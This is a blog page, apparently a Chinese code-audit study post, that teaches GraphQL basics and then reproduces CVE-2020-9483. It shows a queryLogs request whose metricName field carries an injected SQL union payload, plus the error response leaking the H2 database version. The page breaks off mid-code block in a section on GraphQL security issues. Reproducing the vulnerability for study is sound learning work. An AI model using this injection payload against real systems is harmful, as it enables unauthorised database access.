@@ -1,0 +1,583 @@
+
+
+<!DOCTYPE html>
+<html lang="zh-CN" data-default-color-scheme=&#34;auto&#34;>
+
+
+
+<head>
+  <meta charset="UTF-8">
+  <link rel="apple-touch-icon" sizes="76x76" href="/img/favicon.png">
+  <link rel="icon" href="/img/favicon.png">
+  <meta name="viewport"
+        content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no, shrink-to-fit=no">
+  <meta http-equiv="x-ua-compatible" content="ie=edge">
+  
+  <meta name="theme-color" content="#2f4154">
+  <meta name="description" content="web安全的本质最终还得回归到代码层面.
+本专栏博客主要通过复现历史cms的漏洞,来学习,了解以及总结cms中最容易出问题的功能代码.
+代码审计总结">
+  <meta name="author" content="Noel">
+  <meta name="keywords" content="">
+  
+  <title>一次GraphQL导致的sqli - Noel&#39;s Blog</title>
+
+  <link  rel="stylesheet" href="https://cdn.jsdelivr.net/npm/bootstrap@4.6.0/dist/css/bootstrap.min.css" />
+
+
+  <link  rel="stylesheet" href="https://cdn.jsdelivr.net/npm/github-markdown-css@4.0.0/github-markdown.min.css" />
+  <link  rel="stylesheet" href="/lib/hint/hint.min.css" />
+
+  
+    
+    
+      
+      <link  rel="stylesheet" href="https://cdn.jsdelivr.net/npm/highlight.js@10.7.2/styles/github-gist.min.css" />
+    
+  
+
+  
+    <link  rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fancyapps/fancybox@3.5.7/dist/jquery.fancybox.min.css" />
+  
+
+
+
+<!-- 主题依赖的图标库，不要自行修改 -->
+
+<link rel="stylesheet" href="//at.alicdn.com/t/font_1749284_ba1fz6golrf.css">
+
+
+
+<link rel="stylesheet" href="//at.alicdn.com/t/font_1736178_kmeydafke9r.css">
+
+
+<link  rel="stylesheet" href="/css/main.css" />
+
+<!-- 自定义样式保持在最底部 -->
+
+
+  <script id="fluid-configs">
+    var Fluid = window.Fluid || {};
+    var CONFIG = {"hostname":"n0el4kls.github.io","root":"/","version":"1.8.11","typing":{"enable":true,"typeSpeed":70,"cursorChar":"_","loop":false},"anchorjs":{"enable":true,"element":"h1,h2,h3,h4,h5,h6","placement":"right","visible":"hover","icon":""},"progressbar":{"enable":true,"height_px":3,"color":"#29d","options":{"showSpinner":false,"trickleSpeed":100}},"copy_btn":true,"image_zoom":{"enable":true,"img_url_replace":["",""]},"toc":{"enable":true,"headingSelector":"h1,h2,h3,h4,h5,h6","collapseDepth":0},"lazyload":{"enable":true,"loading_img":"/img/loading.gif","onlypost":false,"offset_factor":2},"web_analytics":{"enable":false,"baidu":null,"google":null,"gtag":null,"tencent":{"sid":null,"cid":null},"woyaola":null,"cnzz":null,"leancloud":{"app_id":null,"app_key":null,"server_url":null}},"search_path":"/local-search.xml"};
+  </script>
+  <script  src="/js/utils.js" ></script>
+  <script  src="/js/color-schema.js" ></script>
+<meta name="generator" content="Hexo 5.4.0"></head>
+
+
+<body>
+  <header style="height: 70vh;">
+    <nav id="navbar" class="navbar fixed-top  navbar-expand-lg navbar-dark scrolling-navbar">
+  <div class="container">
+    <a class="navbar-brand"
+       href="/">&nbsp;<strong>N0el4kLs's blog</strong>&nbsp;</a>
+
+    <button id="navbar-toggler-btn" class="navbar-toggler" type="button" data-toggle="collapse"
+            data-target="#navbarSupportedContent"
+            aria-controls="navbarSupportedContent" aria-expanded="false" aria-label="Toggle navigation">
+      <div class="animated-icon"><span></span><span></span><span></span></div>
+    </button>
+
+    <!-- Collapsible content -->
+    <div class="collapse navbar-collapse" id="navbarSupportedContent">
+      <ul class="navbar-nav ml-auto text-center">
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/">
+                <i class="iconfont icon-home-fill"></i>
+                首页
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/archives/">
+                <i class="iconfont icon-archive-fill"></i>
+                归档
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/categories/">
+                <i class="iconfont icon-category-fill"></i>
+                分类
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/tags/">
+                <i class="iconfont icon-tags-fill"></i>
+                标签
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/about/">
+                <i class="iconfont icon-user-fill"></i>
+                关于
+              </a>
+            </li>
+          
+        
+        
+          <li class="nav-item" id="search-btn">
+            <a class="nav-link" target="_self" data-toggle="modal" data-target="#modalSearch">&nbsp;<i
+                class="iconfont icon-search"></i>&nbsp;</a>
+          </li>
+        
+        
+          <li class="nav-item" id="color-toggle-btn">
+            <a class="nav-link" target="_self">&nbsp;<i
+                class="iconfont icon-dark" id="color-toggle-icon"></i>&nbsp;</a>
+          </li>
+        
+      </ul>
+    </div>
+  </div>
+</nav>
+
+    <div class="banner" id="banner" parallax=true
+         style="background: url('/web_source/shine.jpg') no-repeat center center;
+           background-size: cover;">
+      <div class="full-bg-img">
+        <div class="mask flex-center" style="background-color: rgba(0, 0, 0, 0.3)">
+          <div class="page-header text-center fade-in-up">
+            <span class="h2" id="subtitle" title="一次GraphQL导致的sqli">
+              
+            </span>
+
+            
+              <div class="mt-3">
+  
+  
+    <span class="post-meta">
+      <i class="iconfont icon-date-fill" aria-hidden="true"></i>
+      <time datetime="2022-03-02 06:25" pubdate>
+        2022年3月2日 早上
+      </time>
+    </span>
+  
+</div>
+
+<div class="mt-1">
+  
+    
+    <span class="post-meta mr-2">
+      <i class="iconfont icon-chart"></i>
+      2.8k 字
+    </span>
+  
+
+  
+    
+    <span class="post-meta mr-2">
+      <i class="iconfont icon-clock-fill"></i>
+      
+      
+      37
+       分钟
+    </span>
+  
+
+  
+  
+    
+      <!-- 不蒜子统计文章PV -->
+      <span id="busuanzi_container_page_pv" style="display: none">
+        <i class="iconfont icon-eye" aria-hidden="true"></i>
+        <span id="busuanzi_value_page_pv"></span> 次
+      </span>
+    
+  
+</div>
+
+            
+          </div>
+
+          
+        </div>
+      </div>
+    </div>
+  </header>
+
+  <main>
+    
+      
+
+<div class="container-fluid nopadding-x">
+  <div class="row nomargin-x">
+    <div class="d-none d-lg-block col-lg-2"></div>
+    <div class="col-lg-8 nopadding-x-md">
+      <div class="container nopadding-x-md" id="board-ctn">
+        <div class="py-5" id="board">
+          <article class="post-content mx-auto">
+            <!-- SEO header -->
+            <h1 style="display: none">一次GraphQL导致的sqli</h1>
+            
+              <p class="note note-info">
+                
+                  本文最后更新于：1 分钟前
+                
+              </p>
+            
+            <div class="markdown-body">
+              <p><em><strong>web安全的本质最终还得回归到代码层面.</strong></em></p>
+<p>本专栏博客主要通过复现历史cms的漏洞,来学习,了解以及总结cms中最容易出问题的功能代码.</p>
+<a href="/2021/11/15/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1%E6%80%BB%E7%BB%93/" title="代码审计总结">代码审计总结</a>
+
+<span id="more"></span>
+
+<p>本次漏洞复现需要利用到的知识：<code>GraphQL</code>,所以在这里简单学习和了解一下其相关知识</p>
+<p>[toc]</p>
+<h1 id="简介"><a href="#简介" class="headerlink" title="简介"></a>简介</h1><blockquote>
+<p>GraphQL 是一个用于 API 的查询语言，是一个使用基于类型系统来执行查询的服务端运行时（类型系统由你的数据定义）。GraphQL 并没有和任何特定数据库或者存储引擎绑定，而是依靠你现有的代码和数据支撑。</p>
+</blockquote>
+<p>开始我觉得很疑惑,为什么还要专门为了查询API而专门设置一门语言?</p>
+<p>其官方主打的招牌:<code>请求你所要的数据 不多不少</code>.</p>
+<h1 id="基础知识"><a href="#基础知识" class="headerlink" title="基础知识"></a>基础知识</h1><h3 id="字段-Fields"><a href="#字段-Fields" class="headerlink" title="字段 (Fields)"></a>字段 (Fields)</h3><p>字段可以理解为对象中的索引,它可以帮助我们查找具体的内容.</p>
+<p>假设我们使用工具发起一次这样的查询请求:</p>
+<figure class="highlight clojure"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs clojure">&#123;<br>	doctor &#123;<br>		name<br>		age<br>	&#125;<br>&#125;<br></code></pre></td></tr></table></figure>
+
+<p>其返回的内容是这样的</p>
+<figure class="highlight json"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs json">&#123;<br>    <span class="hljs-attr">&quot;data&quot;</span>: &#123;<br>        <span class="hljs-attr">&quot;doctor&quot;</span>:&#123;<br>            <span class="hljs-attr">&quot;name&quot;</span>: <span class="hljs-string">&quot;doctor-strange&quot;</span><br>            <span class="hljs-string">&quot;age&quot;</span>: <span class="hljs-number">30</span><br>        &#125;<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure>
+
+<p>可以看到查询结果的结构和查询结构相似.这也是<code>GraphQL</code>的一个重要特性,它可以帮助我们更好的获取我们想要的数据</p>
+<h3 id="参数-Arguments"><a href="#参数-Arguments" class="headerlink" title="参数 (Arguments)"></a>参数 (Arguments)</h3><p>实际上,为了通过<code>GrqphQL</code>查询到我们想要的内容,在查询语句中还加入了一个类似于过滤的功能,也就是参数.</p>
+<figure class="highlight clojure"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs clojure">&#123;<br>  human(<span class="hljs-name">id:</span> <span class="hljs-string">&quot;1000&quot;</span>) &#123;<br>    name<br>    height<br>  &#125;<br>&#125;<br></code></pre></td></tr></table></figure>
+
+<p>其查询结果为:</p>
+<figure class="highlight json"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs json">&#123;<br>  <span class="hljs-attr">&quot;data&quot;</span>: &#123;<br>    <span class="hljs-attr">&quot;human&quot;</span>: &#123;<br>      <span class="hljs-attr">&quot;name&quot;</span>: <span class="hljs-string">&quot;Luke Skywalker&quot;</span>,<br>      <span class="hljs-attr">&quot;height&quot;</span>: <span class="hljs-number">5.6430448</span><br>    &#125;<br>  &#125;<br>&#125;<br></code></pre></td></tr></table></figure>
+
+
+
+<h3 id="别名-Aliases"><a href="#别名-Aliases" class="headerlink" title="别名 (Aliases)"></a>别名 (Aliases)</h3><p>先给出一个使用别名的例子:</p>
+<figure class="highlight clojure"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs clojure">&#123;<br>  empireHero: hero(<span class="hljs-name">episode:</span> EMPIRE) &#123;<br>    name<br>  &#125;<br>  jediHero: hero(<span class="hljs-name">episode:</span> JEDI) &#123;<br>    name<br>  &#125;<br>&#125;<br></code></pre></td></tr></table></figure>
+
+<p>将<code>hero(expisode: EMPIRE)</code>的查询结果取别名为<code>empireHero</code>,<code>hero(expisode: JEDI)</code>的查询结果取别名为<code>jediHero</code>.来看看查询结果</p>
+<figure class="highlight json"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs json">&#123;<br>  <span class="hljs-attr">&quot;data&quot;</span>: &#123;<br>    <span class="hljs-attr">&quot;empireHero&quot;</span>: &#123;<br>      <span class="hljs-attr">&quot;name&quot;</span>: <span class="hljs-string">&quot;Luke Skywalker&quot;</span><br>    &#125;,<br>    <span class="hljs-attr">&quot;jediHero&quot;</span>: &#123;<br>      <span class="hljs-attr">&quot;name&quot;</span>: <span class="hljs-string">&quot;R2-D2&quot;</span><br>    &#125;<br>  &#125;<br>&#125;<br></code></pre></td></tr></table></figure>
+
+<p>分别给需要查询同一字段但不同参数的查询使用别名,有利于在相同的 GraphQL 字段中拿到不同名称的数据集合,这也是别名的使用场景.</p>
+<h3 id="片段-Fragments"><a href="#片段-Fragments" class="headerlink" title="片段 (Fragments)"></a>片段 (Fragments)</h3><p>简单描述,字段就是字段就是一个查询中重复的内容.举个例子:</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><code class="hljs graphql">&#123;<br>	doctor&#123;<br>		name<br>		age<br>		wife&#123;<br>			name<br>			age<br>		&#125;<br>	&#125;<br>	dancer&#123;<br>		name<br>		age<br>	&#125;<br>&#125;<br></code></pre></td></tr></table></figure>
+
+<p>可以看到上述例子中重复使用了大量的<code>&#123;name,age&#125;</code>,因此我们可以使用<code>Fragments</code>将上述例子进行简化</p>
+<figure class="highlight lasso"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><code class="hljs lasso">&#123;<br>	doctor&#123;<br>		<span class="hljs-params">...</span>PersonInfo<br>		wife&#123;<br>			<span class="hljs-params">...</span>PersonInfo<br>		&#125;<br>	&#125;<br>	dancer&#123;<br>		<span class="hljs-params">...</span>PersonInfo<br>	&#125;<br>&#125;<br><br>fragment PersonInfo <span class="hljs-keyword">on</span> Character&#123;<br>	name<br>	age<br>&#125;<br></code></pre></td></tr></table></figure>
+
+<blockquote>
+<p>!注意: 定义的 fragment 中不能存在自身的套娃形式.比如上述定义了 fragment PersionInfo, 不能在其内部再次使用PersonInfo</p>
+</blockquote>
+<h3 id="操作名称-Operation-Name"><a href="#操作名称-Operation-Name" class="headerlink" title="操作名称 (Operation Name)"></a>操作名称 (Operation Name)</h3><p>上面的一些示例都省略了操作类型关键字以及操作名称,比如就<a href="#%E5%AD%97%E6%AE%B5" title="Fields">字段</a>中的示例,其完整部分应该为:</p>
+<figure class="highlight nginx"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs nginx"><span class="hljs-attribute">query</span> HeroNameAndFriends &#123;<br>  <span class="hljs-section">hero</span> &#123;<br>    <span class="hljs-attribute">name</span><br>    friends &#123;<br>      <span class="hljs-attribute">name</span><br>    &#125;<br>  &#125;<br>&#125;<br></code></pre></td></tr></table></figure>
+
+<p>其中, <code>query</code>表示操作类型,除此之外,还有<code>mutation</code>和<code>subscripion</code>两种操作类型.</p>
+<p>而<code>HeroNameAndFriends</code>是操作名称,一般在单次查询中可以省略.</p>
+<blockquote>
+<p>它仅在有多个操作的文档中是必需的，但我们鼓励使用它，因为它对于调试和服务器端日志记录非常有用.当在你的网络或是 GraphQL 服务器的日志中出现问题时，通过名称来从你的代码库中找到一个查询比尝试去破译内容更加容易。 就把它想成你喜欢的程序语言中的函数名。例如，在 JavaScript 中，我们只用匿名函数就可以工作，但是当我们给了函数名之后，就更加容易追踪、调试我们的代码，并在其被调用的时候做日志</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs graphql">query HeroNameAndFriends($episode: Episode) &#123;<br>hero(episode: $episode) &#123;<br>name<br>friends &#123;<br>name<br>&#125;<br>&#125;<br>&#125;<br></code></pre></td></tr></table></figure>
+</blockquote>
+<p>在一般书写中,还是建议使用完整写法,这样可以避免代码出现歧义.</p>
+<h3 id="变量-Variables"><a href="#变量-Variables" class="headerlink" title="变量 (Variables)"></a>变量 (Variables)</h3><p>我们不希望在改变参数值的时候，重新构建整个查询，因此便出现了变量.变量定义以字符 <code>$</code> 开头，然后是变量的类型。举个例子:</p>
+<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs javascript">query <span class="hljs-function"><span class="hljs-title">HeroNameAndFriends</span>(<span class="hljs-params">$episode: <span class="hljs-built_in">String</span></span>)</span> &#123;<br>  <span class="hljs-function"><span class="hljs-title">hero</span>(<span class="hljs-params">episode: $episode</span>)</span> &#123;<br>    name<br>    friends &#123;<br>      name<br>    &#125;<br>  &#125;<br>&#125;<br></code></pre></td></tr></table></figure>
+
+<p>如上,我们定义了一个名为<code>episode</code>的变量,其类型为<code>String</code>.类似于函数的的参数, 变量也是存在默认值的.示例如下,变量<code>spisode</code>变量的默认值为<code>JEDI</code>:</p>
+<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs javascript">query <span class="hljs-function"><span class="hljs-title">HeroNameAndFriends</span>(<span class="hljs-params">$episode: Episode = <span class="hljs-string">&quot;JEDI&quot;</span></span>)</span> &#123;<br>  <span class="hljs-function"><span class="hljs-title">hero</span>(<span class="hljs-params">episode: $episode</span>)</span> &#123;<br>    name<br>    friends &#123;<br>      name<br>    &#125;<br>  &#125;<br>&#125;<br></code></pre></td></tr></table></figure>
+
+
+
+<h3 id="指令-Directives"><a href="#指令-Directives" class="headerlink" title="指令 (Directives)"></a>指令 (Directives)</h3><p>指令类似于函数中的 <code>IF</code>条件判断:</p>
+<ul>
+<li><code>@include(if: Boolean)</code> 仅在参数为 <code>true</code> 时，包含此字段</li>
+<li><code>@skip(if: Boolean)</code> 如果参数为 <code>true</code>，跳过此字段</li>
+</ul>
+<p>我们来看例子:</p>
+<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs javascript">query <span class="hljs-function"><span class="hljs-title">Hero</span>(<span class="hljs-params">$episode: Episode, $withFriends: <span class="hljs-built_in">Boolean</span>!</span>)</span> &#123;<br>  <span class="hljs-function"><span class="hljs-title">hero</span>(<span class="hljs-params">episode: $episode</span>)</span> &#123;<br>    name<br>    friends @<span class="hljs-function"><span class="hljs-title">include</span>(<span class="hljs-params"><span class="hljs-keyword">if</span>: $withFriends</span>)</span> &#123;<br>      name<br>    &#125;<br>  &#125;<br>&#125;<br></code></pre></td></tr></table></figure>
+
+<p>上面的查询语句可以理解为当变量<code>$withFrieds</code>的值为<code>true</code>的时候,才能够去查询<code>friends</code>对象下的<code>name</code>字段.</p>
+<h3 id="变更-Mutations"><a href="#变更-Mutations" class="headerlink" title="变更 (Mutations)"></a>变更 (Mutations)</h3><p>很多人一开始接触<code>GraphQL</code>都喜欢把他和数据库进行比较.从前面的一些基础语法中我们已经可以大概感受到他与数据库之间的区别了.但还有一些相同的地方,<code>Graphql</code>也可以变更数据.</p>
+<figure class="highlight reasonml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><code class="hljs reasonml">mutation <span class="hljs-constructor">CreateReviewForEpisode($<span class="hljs-params">ep</span>: Episode!, $<span class="hljs-params">review</span>: ReviewInput!)</span> &#123;<br>  create<span class="hljs-constructor">Review(<span class="hljs-params">episode</span>: $<span class="hljs-params">ep</span>, <span class="hljs-params">review</span>: $<span class="hljs-params">review</span>)</span> &#123;<br>    stars<br>    commentary<br>  &#125;<br>&#125;<br><br>variables:<br>&#123;<br>  <span class="hljs-string">&quot;ep&quot;</span>: <span class="hljs-string">&quot;JEDI&quot;</span>,<br>  <span class="hljs-string">&quot;review&quot;</span>: &#123;<br>    <span class="hljs-string">&quot;stars&quot;</span>: <span class="hljs-number">5</span>,<br>    <span class="hljs-string">&quot;commentary&quot;</span>: <span class="hljs-string">&quot;This is a great movie!&quot;</span><br>  &#125;<br>&#125;<br></code></pre></td></tr></table></figure>
+
+<p>返回结果:</p>
+<figure class="highlight json"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs json">&#123;<br>  <span class="hljs-attr">&quot;data&quot;</span>: &#123;<br>    <span class="hljs-attr">&quot;createReview&quot;</span>: &#123;<br>      <span class="hljs-attr">&quot;stars&quot;</span>: <span class="hljs-number">5</span>,<br>      <span class="hljs-attr">&quot;commentary&quot;</span>: <span class="hljs-string">&quot;This is a great movie!&quot;</span><br>    &#125;<br>  &#125;<br>&#125;<br></code></pre></td></tr></table></figure>
+
+<blockquote>
+<p>注意 <code>createReview</code> 字段如何返回了新建的 review 的 <code>stars</code> 和 <code>commentary</code> 字段。这在变更已有数据时特别有用，例如，当一个字段自增的时候，我们可以在一个请求中变更并查询这个字段的新值</p>
+</blockquote>
+<h3 id="内联片段-Inline-Fragments"><a href="#内联片段-Inline-Fragments" class="headerlink" title="内联片段 (Inline Fragments)"></a>内联片段 (Inline Fragments)</h3><figure class="highlight lasso"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><code class="hljs lasso">query HeroForEpisode($ep: Episode!) &#123;<br>  hero(episode: $ep) &#123;<br>    name<br>    <span class="hljs-params">...</span> <span class="hljs-keyword">on</span> Droid &#123;<br>      primaryFunction<br>    &#125;<br>    <span class="hljs-params">...</span> <span class="hljs-keyword">on</span> Human &#123;<br>      height<br>    &#125;<br>  &#125;<br>&#125;<br><br>variables:<br>&#123;<br>  <span class="hljs-string">&quot;ep&quot;</span>: <span class="hljs-string">&quot;JEDI&quot;</span><br>&#125;<br></code></pre></td></tr></table></figure>
+
+<p>返回结果:</p>
+<figure class="highlight json"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs json">&#123;<br>  <span class="hljs-attr">&quot;data&quot;</span>: &#123;<br>    <span class="hljs-attr">&quot;hero&quot;</span>: &#123;<br>      <span class="hljs-attr">&quot;name&quot;</span>: <span class="hljs-string">&quot;R2-D2&quot;</span>,<br>      <span class="hljs-attr">&quot;primaryFunction&quot;</span>: <span class="hljs-string">&quot;Astromech&quot;</span><br>    &#125;<br>  &#125;<br>&#125;<br></code></pre></td></tr></table></figure>
+
+<p>可以看到当参数为<code>JEDI</code>时,返回了<code>primaryFunction</code>的内容.原因是第一个片段标注为 <code>... on Droid</code>，<code>primaryFunction</code> 仅在 <code>hero</code> 返回的 <code>Character</code> 为 <code>Droid</code> 类型时才会执行,而我们输入的参数正式满足了这个要求.同理适用于 <code>Human</code> 类型的 <code>height</code> 字段.</p>
+<h1 id="实战"><a href="#实战" class="headerlink" title="实战"></a>实战</h1><p>在了解了部分基础语法后,我们来看看本次<code>CVE-2020-9483</code>中使用到的<code>Graphql</code>语句.</p>
+<figure class="highlight puppet"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs puppet"><span class="hljs-comment"># 语句部分</span><br>query quertLogs(<span class="hljs-variable">$condition</span>: LogQueryCondition) &#123; <span class="hljs-comment"># 定义变量 类型为LogQueryCondition</span><br>  queryLogs(condition: <span class="hljs-variable">$condition</span>) &#123; <span class="hljs-comment"># 使用带参数的查询</span><br>    total<br>    <span class="hljs-keyword">logs</span> &#123; <span class="hljs-comment"># 次级选择</span><br>      serviceId<br>      serviceName<br>      isError<br>      <span class="hljs-literal">content</span><br>    &#125;<br>  &#125;<br>&#125;<br></code></pre></td></tr></table></figure>
+
+<figure class="highlight 1c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><code class="hljs 1c"><span class="hljs-meta"># 变量部分</span><br>&#123;<br>  <span class="hljs-string">&quot;condition&quot;</span>: &#123;<br>    <span class="hljs-string">&quot;metricName&quot;</span>: <span class="hljs-string">&quot;INFORMATION_SCHEMA.USERS union select h2version())a where 1=? or 1=? or 1=? --&quot;</span>,<span class="hljs-meta"># 注入点</span><br>    <span class="hljs-string">&quot;endpointId&quot;</span>: <span class="hljs-string">&quot;1&quot;</span>,<br>    <span class="hljs-string">&quot;traceId&quot;</span>: <span class="hljs-string">&quot;1&quot;</span>,<br>    <span class="hljs-string">&quot;state&quot;</span>: <span class="hljs-string">&quot;ALL&quot;</span>,<br>    <span class="hljs-string">&quot;stateCode&quot;</span>: <span class="hljs-string">&quot;1&quot;</span>,<br>    <span class="hljs-string">&quot;paging&quot;</span>: &#123;<br>      <span class="hljs-string">&quot;pageSize&quot;</span>: <span class="hljs-number">10</span><br>    &#125;<br>  &#125;<br>&#125;<br></code></pre></td></tr></table></figure>
+
+<figure class="highlight swift"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs swift"># 返回部分<br>&#123;<br>  <span class="hljs-string">&quot;data&quot;</span>: &#123;&#125;,<br>  <span class="hljs-string">&quot;errors&quot;</span>: [<br>    &#123;<br>      <span class="hljs-string">&quot;message&quot;</span>: <span class="hljs-string">&quot;Exception while fetching data (/queryLogs) : Data conversion error converting <span class="hljs-subst">\&quot;</span>1.4.196<span class="hljs-subst">\&quot;</span>; SQL statement:<span class="hljs-subst">\n</span>select count(1) total from (select 1 from INFORMATION_SCHEMA.USERS union select h2version())a where 1=? or 1=? or 1=? -- where  1=1  and endpoint_id = ? and status_code = ? and trace_id = ? ) [22018-196]&quot;</span><br>    &#125;<br>  ]<br>&#125;<br></code></pre></td></tr></table></figure>
+
+
+
+<h1 id="安全问题"><a href="#安全问题" class="headerlink" title="安全问题"></a>安全问题</h1><p>既然是一个查询API的工具，回想了一下在日常中SRC中各种关于API漏洞，于是思考：在<code>GraphQL</code>中是否也同样存在呢?</p>
+<p>通过Google发现，在<code>GraphQL</code>中也存在一定的安全问题的,我收集了了一部分,如下:</p>
+<h3 id="泄露了-graphql接口"><a href="#泄露了-graphql接口" class="headerlink" title="泄露了/graphql接口"></a>泄露了<code>/graphql</code>接口</h3><p>作为<code>GraphQL</code>的查询入口,如果连入口都暴露在了公网,无疑就是向黑客打开了半扇门.并且大多数开放了此接口的网站都存在信息泄露.</p>
+<figure class="highlight applescript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br></pre></td><td 